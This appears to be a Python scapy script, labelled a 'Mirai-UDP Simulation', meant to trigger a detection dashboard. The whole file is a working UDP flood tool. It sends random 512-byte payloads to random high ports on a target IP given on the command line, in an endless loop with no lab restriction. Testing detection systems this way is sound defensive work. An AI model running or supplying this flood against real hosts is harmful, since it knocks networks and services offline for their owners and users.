from scapy.all import IP, UDP, Raw, send
import sys
import time
import random

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.1"
if len(sys.argv) > 1:
    TARGET_IP = sys.argv[1]

print(f"💀 [BOTNET] Mirai-UDP Simulation")
print(f"[*] Targeting: {TARGET_IP}")
print(f"[*] This will trigger 'Mirai-UDP' on the dashboard.")
time.sleep(2)

count = 0
payload = Raw(load=random.randbytes(512)) # Mirai often uses fixed-size malicious payloads

try:
    while True:
        # Mirai-UDP often targets random high ports
        pkt = IP(dst=TARGET_IP)/UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535))/payload
        send(pkt, verbose=0, count=5)
        count += 5
        if count % 100 == 0:
            print(f"📡 Flooding... {count} packets sent", end='\r')
except KeyboardInterrupt:
    print(f"\n🛑 Stopped. Total: {count}")
